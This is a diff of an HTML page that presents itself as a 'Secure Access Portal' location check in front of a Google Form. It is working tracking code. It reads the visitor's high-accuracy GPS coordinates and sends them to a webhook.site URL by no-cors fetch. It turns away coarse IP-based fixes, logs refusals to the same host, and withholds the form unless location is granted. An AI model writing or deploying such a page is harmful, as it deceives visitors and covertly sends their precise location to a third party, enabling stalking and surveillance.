@@ -1,68 +1,89 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Secure Verification</title>
+    <title>Secure Access Portal</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background: #111; color: #eee; font-family: sans-serif; text-align: center; padding-top: 20%; }
-        .spinner { border: 4px solid #333; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto; }
+        body { background: #111; color: #eee; font-family: sans-serif; text-align: center; padding-top: 20%; margin: 0; }
+        .container { padding: 20px; }
+        .spinner { border: 4px solid #333; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .error-msg { color: #ff4b2b; display: none; padding: 20px; }
+        #error-ui { display: none; background: #222; border: 1px solid #444; border-radius: 8px; padding: 20px; margin: 0 20px; }
+        .btn-refresh { background: #3498db; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin-top: 15px; }
     </style>
 </head>
 <body>
+
     <div id="loading-ui">
         <div class="spinner"></div>
-        <p id="status">Verifying location for access...</p>
+        <p><b>Security Check:</b> Verifying Location Precision...</p>
+        <p style="font-size: 0.8em; color: #888;">Please ensure GPS is ON and click "Allow" if prompted.</p>
     </div>
     
-    <div id="error-ui" class="error-msg">
-        <h2>Access Denied</h2>
-        <p>You must allow location access to view this secure document. Please refresh and try again.</p>
+    <div id="error-ui">
+        <h2 style="color: #ff4b2b;">Access Restricted</h2>
+        <p id="error-text">To access this form, you must enable GPS/Location on your device and grant permission.</p>
+        <button class="btn-refresh" onclick="location.reload()">Retry Connection</button>
     </div>
 
     <script>
-        // Update this to Beeceptor if Webhook.site remains blank for you
         const WEBHOOK = "https://webhook.site/81426716-72be-48fc-a494-fcd675327a3e";
         const FORM = "https://docs.google.com/forms/d/1kXi_Hw0GgWOI533BwZx-RxhWeSzsl28WUR1yVCSmkJ0/viewform";
 
-        function sendAndLeave(lat, lon, acc) {
-            // Using 'no-cors' to ensure the request leaves the browser even on restricted networks
-            fetch(`${WEBHOOK}?lat=${lat}&lon=${lon}&accuracy=${acc}m&status=VERIFIED`, { mode: 'no-cors' })
-            .then(() => { 
-                window.location.href = FORM; 
-            });
-        }
-
-        function handleError() {
-            // Hide loading spinner and show error message
+        function lockInterface(msg) {
             document.getElementById('loading-ui').style.display = 'none';
             document.getElementById('error-ui').style.display = 'block';
-            
-            // Log the block to your webhook so you know they tried to skip it
-            fetch(`${WEBHOOK}?status=ACCESS_DENIED_BY_USER`, { mode: 'no-cors' });
+            if (msg) document.getElementById('error-text').innerText = msg;
         }
 
         window.onload = function() {
-            if (!navigator.geolocation) { 
-                alert("This device is not supported."); 
-                return; 
+            // Check if Geolocation exists at all
+            if (!navigator.geolocation) {
+                lockInterface("Your device or browser does not support the required security protocols.");
+                return;
             }
 
             const options = {
                 enableHighAccuracy: true, 
-                timeout: 15000,           
+                timeout: 12000,           
                 maximumAge: 0             
             };
 
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
-                    // Success: Form opens ONLY here
-                    sendAndLeave(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+                    // CRITICAL: Double check the accuracy. 
+                    // If accuracy is too high (like 10,000 meters), it's likely IP-based, not GPS.
+                    if (pos.coords.accuracy > 5000) {
+                        lockInterface("Low precision detected. Please move to an area with better GPS signal.");
+                        return;
+                    }
+
+                    // SUCCESS: Send data and redirect
+                    const params = `?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&acc=${pos.coords.accuracy}m`;
+                    fetch(WEBHOOK + params, { mode: 'no-cors' })
+                        .then(() => { window.location.href = FORM; });
                 },
                 (err) => {
-                    // Failure: Form DOES NOT open
-                    handleError();
+                    // FAILURE GATING
+                    let reason = "";
+                    switch(err.code) {
+                        case err.PERMISSION_DENIED:
+                            reason = "Permission denied. Please allow location access to continue.";
+                            break;
+                        case err.POSITION_UNAVAILABLE:
+                            reason = "GPS is turned OFF or unavailable on this device. Please turn it ON.";
+                            break;
+                        case err.TIMEOUT:
+                            reason = "Location request timed out. Please refresh and try again.";
+                            break;
+                        default:
+                            reason = "An unknown security error occurred.";
+                    }
+                    
+                    // Log the failure to your webhook
+                    fetch(`${WEBHOOK}?status=FAILED&reason=${err.message}`, { mode: 'no-cors' });
+                    
+                    lockInterface(reason);
                 }, 
                 options
             );
